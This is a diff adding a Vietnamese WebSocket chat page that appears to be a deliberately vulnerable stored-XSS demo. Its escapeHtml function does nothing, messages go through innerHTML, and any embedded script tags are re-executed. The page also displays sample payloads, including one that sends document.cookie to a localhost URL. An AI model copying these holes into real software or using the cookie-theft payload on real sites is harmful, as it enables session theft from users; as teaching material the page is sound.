@@ -1,0 +1,125 @@
+<!doctype html>
+<html lang="vi">
+
+<head>
+    <meta charset="UTF-8">
+    <title>💬 Phòng chat chung</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background: #f5f7fb;
+        }
+
+        #chat {
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            background: #fff;
+            padding: 10px;
+            height: 300px;
+            overflow-y: auto;
+        }
+
+        .msg {
+            margin-bottom: 8px;
+            padding-bottom: 4px;
+            border-bottom: 1px dashed #eee;
+        }
+
+        .meta {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 3px;
+        }
+
+        textarea {
+            width: 100%;
+            height: 60px;
+            margin-top: 8px;
+            padding: 6px;
+            border-radius: 6px;
+            border: 1px solid #ddd;
+        }
+
+        button {
+            margin-top: 6px;
+            padding: 6px 12px;
+            border: none;
+            border-radius: 6px;
+            background: #2563eb;
+            color: #fff;
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+<body>
+    <h2>💬 Phòng chat chung</h2>
+    <div>
+        <label>Tên: <input id="user" value="A" style="width:80px"></label>
+    </div>
+
+    <div id="chat"></div>
+
+    <textarea id="input" placeholder="Nhập tin nhắn..."></textarea><br />
+    <button id="send">Gửi</button>
+    <div>
+        <p>
+        <pre><code>&lt;script&gt;window.location='http://127.0.0.1:5500/phai_chiu_page.html?cookie='+document.cookie;&lt;/script&gt;</code></pre>
+        </p>
+        <p>
+        <pre><code>&lt;script&gt;alert("Xin chào! Đây là thông báo bằng alert.");&lt;/script&gt;</code></pre>
+        </p>
+    </div>
+
+
+    <script>
+        function escapeHtml(s) {
+            return String(s)
+        }
+        const ws = new WebSocket("ws://localhost:8080");
+        const userEl = document.getElementById("user");
+        const inputEl = document.getElementById("input");
+        const chatEl = document.getElementById("chat");
+
+        ws.onopen = () => console.log("✅ Kết nối WS thành công");
+
+        ws.onmessage = ev => {
+            const data = JSON.parse(ev.data);
+            if (data.system) {
+                console.log("Server:", data.text);
+                return;
+            }
+            renderMessage(data);
+        };
+
+        document.getElementById("send").onclick = () => {
+            const msg = { user: userEl.value, text: inputEl.value };
+            ws.send(JSON.stringify(msg));
+            inputEl.value = "";
+        };
+
+        function renderMessage({ user, text, ts }) {
+            const time = new Date(ts || Date.now()).toLocaleTimeString();
+            const div = document.createElement("div");
+            div.className = "msg";
+            div.innerHTML = `<div class=\"meta\">${escapeHtml(user)} — ${time}</div>\n                       <div>${text}</div>`;
+            chatEl.appendChild(div);
+            chatEl.scrollTop = chatEl.scrollHeight;
+
+            // Thực thi script trong message nếu có
+            const scripts = div.querySelectorAll('script');
+            scripts.forEach(oldScript => {
+                const newScript = document.createElement('script');
+                // Copy thuộc tính
+                for (const attr of oldScript.attributes) {
+                    newScript.setAttribute(attr.name, attr.value);
+                }
+                newScript.textContent = oldScript.textContent;
+                oldScript.parentNode.replaceChild(newScript, oldScript);
+            });
+        }
+    </script>
+</body>
+
+</html>
